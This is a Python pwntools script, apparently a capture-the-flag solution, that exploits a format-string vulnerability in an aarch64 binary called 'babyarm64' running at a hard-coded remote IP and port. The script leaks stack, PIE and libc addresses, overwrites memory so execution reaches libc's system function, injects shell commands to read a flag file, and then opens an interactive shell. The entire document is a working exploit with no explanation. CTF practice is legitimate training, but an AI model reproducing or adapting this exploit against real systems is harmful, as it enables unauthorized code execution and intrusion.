#!/usr/bin/env python
from pwn import *

context.arch = 'aarch64'

e , l = ELF( './babyarm64/babyarm64_6fecf89af35702a60e1a2b0f8debdd3d' ) , ELF( './babyarm64/lib/libc.so.6' )

host = '203.66.68.95'
port = 44444
y = remote( host , port )

p = '%24$p\n'
y.send( p )
y.recvuntil( '0x' )
stk = int( y.recvline() , 16 )
success( 'stack -> %s' % hex( stk ) )
sleep(0.5)

p = '%29$p\n'
y.send( p )
y.recvuntil( '0x' )
pie = int( y.recvline() , 16 ) - 0xa54
success( 'PIE -> %s' % hex( pie ) )
sleep(0.5)

p = '%16$s'.ljust( 0x30 , '\x00' ) + p64( pie + e.got['read'] )
y.send( p )
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0xba1a0
success( 'libc -> %s' % hex( l.address ) )
sleep(0.5)

print hex( l.symbols.system )

a = ( l.symbols['system'] & 0xffff0000 ) >> 16
b = l.symbols['system'] & 0xffff

p = '%{}c%14$n%{}c%15$hn'.format( a , b - a ).ljust( 0x20 , '\x00' )
p += p64( stk - 0x18 + 2 ) # 16
p += p64( stk - 0x18 ) # 17
y.send( p )
sleep(2)

#y.send( ';' * 0xa0 )

#sleep(0.5)

stop = 0x11014
p = ';cat /home/`whoami`/flag;%16$n'.ljust( 0x30 , '\x00' ) + p64( pie + stop )
y.send( p )


'''
print hex( l.symbols.system )
for i in xrange( 1 , 0x100 ):
    p = '%{}$p\n\x00'.format( i )
    y.send( p )
    print i , y.recvline()
'''

sleep(1)
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()